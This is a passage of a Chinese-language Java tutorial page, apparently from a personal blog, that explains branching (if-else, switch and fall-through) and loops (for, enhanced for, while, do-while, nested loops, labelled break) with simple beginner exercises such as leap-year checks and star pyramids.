class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">12</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-number">15</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> x + y;<br><span class="hljs-keyword">if</span> (sum%<span class="hljs-number">3</span>==<span class="hljs-number">0</span> &amp;&amp; sum%<span class="hljs-number">5</span>==<span class="hljs-number">0</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;可以整除&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;不可以整除&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>3.判断一个年份是否是闰年，闰年的条件是符合下面的二者之一：</p><p>​（1）年份能被4整除，但不能被100整除</p><p>​（2）能被400整除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;今夕是何年：&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">year</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br><span class="hljs-keyword">if</span> ((year%<span class="hljs-number">4</span>==<span class="hljs-number">0</span> &amp;&amp; year %<span class="hljs-number">100</span>!=<span class="hljs-number">0</span>) || year%<span class="hljs-number">400</span> == <span class="hljs-number">0</span>) &#123;<br>System.out.println(year+<span class="hljs-string">&quot;是闰年。&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(year+<span class="hljs-string">&quot;不是闰年。&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-多条件分支-if-elseif-else"><a href="#2-多条件分支-if-elseif-else" class="headerlink" title="2.多条件分支 if-elseif-else"></a>2.多条件分支 if-elseif-else</h2><p>例子：判断保国分数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;保国信用分：&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br><span class="hljs-comment">//范围判断</span><br><span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">1</span> &amp;&amp; score &lt;=<span class="hljs-number">100</span>) &#123;<br><span class="hljs-comment">//四种情况</span><br><span class="hljs-keyword">if</span> (score == <span class="hljs-number">100</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;信用良好&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (score&gt;<span class="hljs-number">80</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;信用优秀&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (score&gt;=<span class="hljs-number">60</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;信用一般&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;信用不及格&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;超出范围。&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-嵌套分支"><a href="#3-嵌套分支" class="headerlink" title="3.嵌套分支"></a>3.嵌套分支</h2><p>嵌套分支不应该大于3层。</p><p>例子：</p><p>参加歌手比赛，如果初赛成绩大于8.0进入决赛，否则提示淘汰。并且根据性别提示进入男子组或女子组。【可以让学员先练习下】，输入成绩和性别，进行判断和输出信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Nestedlf</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;请输入该歌手的成绩：&quot;</span>);<br><span class="hljs-type">double</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> scanner.nextDouble();<br><span class="hljs-keyword">if</span> (score &gt; <span class="hljs-number">8.0</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;请输入性别：&quot;</span>);<br><span class="hljs-type">char</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> scanner.next().charAt(<span class="hljs-number">0</span>); <span class="hljs-comment">//取出第一个字符</span><br><span class="hljs-keyword">if</span> (gender == <span class="hljs-string">&#x27;男&#x27;</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;进入男子组&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (gender == <span class="hljs-string">&#x27;女&#x27;</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;进入女子组&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;性别有误，不能参加决赛。&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;你被淘汰了。&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220502002421626.png" alt="image-20220502002421626"></p><h2 id="4-Switch分支结构"><a href="#4-Switch分支结构" class="headerlink" title="4.Switch分支结构"></a>4.Switch分支结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span>(表达式)&#123;<br>  <span class="hljs-keyword">case</span> 常量<span class="hljs-number">1</span>:<br>    语句块<span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> 常量<span class="hljs-number">2</span>:<br>语句块<span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br>  ....<br>  <span class="hljs-keyword">case</span> 常量n:<br>    语句块n;<br><span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">default</span>语句块<span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;    <br>&#125;<br></code></pre></td></tr></table></figure><p>穿透：如果没有break，会直接执行下一个case的语句块。</p><p><strong>细节：</strong></p><p>1.case后的<strong>常量应该类型一致</strong>，或者是可以自动转成可以相互比较的类型。</p><p>2.switch(表达式)中表达式的返回值必须是：<strong>byte,short,int,char,enum[枚举],string</strong></p><p>3.<strong>case子句中的值必须是常量</strong>，而不能是变量</p><p><strong>例子1：</strong></p><p>对于学生成绩大于60分的，输出“合格”。</p><p>低于50分，输出不合格。（成绩不能大于100）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">switchdetail</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-comment">//double score = myScanner.nextDouble();</span><br><span class="hljs-type">double</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">88.5</span>;<br><span class="hljs-comment">//保证输入成绩有效if-else</span><br><span class="hljs-keyword">if</span>(score &gt;=<span class="hljs-number">0</span> &amp;&amp; score &lt;=<span class="hljs-number">100</span>)&#123;<br><span class="hljs-keyword">switch</span>((<span class="hljs-type">int</span>)(score/<span class="hljs-number">60</span>))&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>System.out.println(<span class="hljs-string">&quot;不及格&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>System.out.println(<span class="hljs-string">&quot;及格&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>System.out.println(<span class="hljs-string">&quot;输入有误。&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;输入的程序需要在0-100之间&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>例子2：</strong></p><p>根据用于指定月份，打印该月份所属的季节。</p><p>3，4，5春季6，7，8夏季 9，10，11秋季12，1，2冬季［课堂练习，提示 使用穿透］</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">switchdetail2</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;输入月份&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">month</span> <span class="hljs-operator">=</span> myscanner.nextInt();<br><span class="hljs-keyword">switch</span>(month)&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>System.out.println(<span class="hljs-string">&quot;这是春天&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>System.out.println(<span class="hljs-string">&quot;这是夏天&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">11</span>:<br>System.out.println(<span class="hljs-string">&quot;这是秋天&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>System.out.println(<span class="hljs-string">&quot;这是冬天&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>System.out.println(<span class="hljs-string">&quot;输入有误&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="switch-和-if-的选择"><a href="#switch-和-if-的选择" class="headerlink" title="switch 和 if 的选择"></a>switch 和 if 的选择</h3><p>1.如果判断的具体数值不多，而且符合<strong>byte、short、int、 char，enum［枚举］，String</strong>这6种类型。虽然两个语句都可以使用，建议使用swtich语句。<br>2.其他情况：对区间判断，对结果为boolean类型判断，使用if，if的使用范围更广.</p><h2 id="5-循环控制"><a href="#5-循环控制" class="headerlink" title="5.循环控制"></a>5.循环控制</h2><h3 id="1-for"><a href="#1-for" class="headerlink" title="1.for"></a>1.for</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(循环变量初始化;循环条件;循环变量迭代)&#123;<br>循环操作(可以多条语句);<br>&#125;<br></code></pre></td></tr></table></figure><p>for(;;)是死循环。</p><h4 id="增强for循环"><a href="#增强for循环" class="headerlink" title="*增强for循环"></a>*增强for循环</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>&#125;;<br><span class="hljs-comment">//普通for循环</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>    System.out.println(<span class="hljs-string">&quot;i=&quot;</span>+nums[i]);<br>&#125;<br><span class="hljs-comment">//增强for循环</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i:nums)&#123; <span class="hljs-comment">//执行流程是：依次从nums数组中取出数据，赋给i，如果取出完毕，就退出for</span><br>    System.out.println(<span class="hljs-string">&quot;i=&quot;</span>+i);<br>&#125;<br></code></pre></td></tr></table></figure><p>输出相同。</p><h3 id="2-while"><a href="#2-while" class="headerlink" title="2.while"></a>2.while</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">循环变量初始化;<br><span class="hljs-keyword">while</span>(循环条件)&#123;<br>循环体(语句);<br>循环变量迭代;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环条件是一个返回布尔值的表达式，while循环是先判断再执行语句。</p><h3 id="3-do-while"><a href="#3-do-while" class="headerlink" title="3.do..while"></a>3.do..while</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">循环变量初始化;<br><span class="hljs-keyword">do</span>&#123;<br>循环体(语句);<br>循环变量迭代;<br>&#125;<span class="hljs-keyword">while</span>(循环条件);<br></code></pre></td></tr></table></figure><p>1） do while是关键字</p><p>2）先执行，后判断（至少执行一次）。</p><p>3）最后有一个分号。</p><h2 id="6-多重循环控制"><a href="#6-多重循环控制" class="headerlink" title="6.多重循环控制"></a>6.多重循环控制</h2><p>1.统计3个班成绩情况，每个班有5名同学，求出各个班的平均分和所有班级的平均分［学生的成绩从键盘输入］。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MulForExercise01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-type">double</span> <span class="hljs-variable">totalscore</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//所有学生的成绩</span><br><span class="hljs-comment">//循环3个班</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">3</span>;i++)&#123;<br><span class="hljs-type">double</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//一个班级的总分</span><br><span class="hljs-comment">//循环5个人</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=<span class="hljs-number">5</span>;j++)&#123;<br>System.out.println(<span class="hljs-string">&quot;请输入第&quot;</span>+i+<span class="hljs-string">&quot;个班的第&quot;</span>+j+<span class="hljs-string">&quot;个学生的成绩&quot;</span>);<br><span class="hljs-type">double</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> myscanner.nextDouble();<br>sum += score;<br>System.out.println(<span class="hljs-string">&quot;成绩为：&quot;</span>+score);<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;sum=&quot;</span>+sum+<span class="hljs-string">&quot;平均分&quot;</span>+(sum/<span class="hljs-number">5</span>));<br>totalscore +=sum;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;所有学生的平均分：&quot;</span>+totalscore/<span class="hljs-number">15</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.空心金字塔</p><p>金字塔</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MulForExercise02</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.print(<span class="hljs-string">&quot;请输入层数：&quot;</span>);<br><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">totalLevel</span> <span class="hljs-operator">=</span> myscanner.nextInt();<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=totalLevel;i++) &#123;<br><span class="hljs-comment">//空格(总层数-当前层数)</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;k &lt;=totalLevel-i;k++) &#123;<br>System.out.print(<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br><span class="hljs-comment">//*</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=<span class="hljs-number">2</span>*i-<span class="hljs-number">1</span>;j++) &#123;<br>System.out.print(<span class="hljs-string">&quot;*&quot;</span>);<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220509221003615.png" alt="image-20220509221003615"></p><p>空心金字塔</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MulForExercise02</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.print(<span class="hljs-string">&quot;请输入层数：&quot;</span>);<br><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">totalLevel</span> <span class="hljs-operator">=</span> myscanner.nextInt();<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=totalLevel;i++) &#123;<br><span class="hljs-comment">//空格(总层数-当前层数)</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;k &lt;=totalLevel-i;k++) &#123;<br>System.out.print(<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br><span class="hljs-comment">//</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=<span class="hljs-number">2</span>*i-<span class="hljs-number">1</span>;j++) &#123;<br><span class="hljs-keyword">if</span> (j==<span class="hljs-number">1</span> ||j==<span class="hljs-number">2</span>*i-<span class="hljs-number">1</span>||i==totalLevel) &#123;<br>System.out.print(<span class="hljs-string">&quot;*&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;System.out.print(<span class="hljs-string">&quot; &quot;</span>);&#125;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220509221831453.png" alt="image-20220509221831453"></p><p>3.九九乘法表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MulForExercise03</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1+1=2</span><br><span class="hljs-comment">1+2=3 2+2=4</span><br><span class="hljs-comment">1+3=4 2+3=5 3+3=6</span><br><span class="hljs-comment">……………………</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">9</span>;i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++) &#123;<br>System.out.print(j+<span class="hljs-string">&quot;+&quot;</span>+i+<span class="hljs-string">&quot;=&quot;</span>+(j+i)+<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220509224142014.png" alt="image-20220509224142014"></p><h2 id="7-break-amp-continue-amp-return"><a href="#7-break-amp-continue-amp-return" class="headerlink" title="7.break&amp;continue&amp;return"></a>7.break&amp;continue&amp;return</h2><h3 id="（1）break"><a href="#（1）break" class="headerlink" title="（1）break"></a>（1）break</h3><p>break语句出现在多层嵌套的语句块中时，可以通过<strong>标签label</strong>指明要终止的是哪一层语句块</p><p><strong>标签的基本使用（尽量不要使用标签）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">label1:&#123; ……<br>label2:&#123; ……<br>label3:&#123;……<br><span class="hljs-keyword">break</span> label2;<br>……<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>break指定到哪个label就退出到哪里。</p><p>如果没有指定break，默认退出最近的循环体。</p><p><strong>例子</strong></p><p>1）1-100以内的数求和，求出当和第一次大于20的当前数【for ＋ break】</p><figure class="highlight java"><table><tr><td 